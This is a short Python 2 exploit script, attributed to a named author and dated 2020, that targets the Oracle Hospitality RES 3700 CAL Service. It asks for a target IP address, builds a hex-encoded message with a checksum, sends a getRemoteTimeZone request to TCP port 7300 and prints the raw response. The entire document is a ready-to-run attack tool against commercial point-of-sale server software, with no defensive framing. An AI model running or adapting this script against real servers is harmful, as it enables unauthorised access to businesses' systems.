#Author: Walid Faour
#Date: Feb. 25, 2020
#Oracle Hospitality RES 3700 CAL Service Exploit

import socket
import binascii
from crccheck.crc import Crc8
from crccheck.checksum import Checksum8

print 
print 'Oracle Hospitality RES 3700 CAL Service Exploit'
print 'Using getRemoteTimeZone method/operation...'
print 

TCP_IP = raw_input("Enter remote Oracle Server IP address: ")
TCP_PORT = 7300 
BUFFER_SIZE = 5000

header1 = "0201"
type = "34"
header2 = "00c0a801"
unknown1 = "03"
node = binascii.hexlify("WALIDFAOR") + "00"
node_add = "0000000000000"
unknown2 = "2000000"
seq = "020101000032"
crc8_checksum = hex(Checksum8.calc(bytearray.fromhex(seq + node)) - 2)[2:]
null_terminators = "00000000000000"

MESSAGE = header1 + type + header2 + unknown1 + node + node_add + unknown2 + crc8_checksum + seq + node + null_terminators

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Sending request...'
s.connect((TCP_IP, TCP_PORT))
s.send(binascii.unhexlify(MESSAGE))
data = s.recv(BUFFER_SIZE)
s.close()

print "Received RAW data:", data



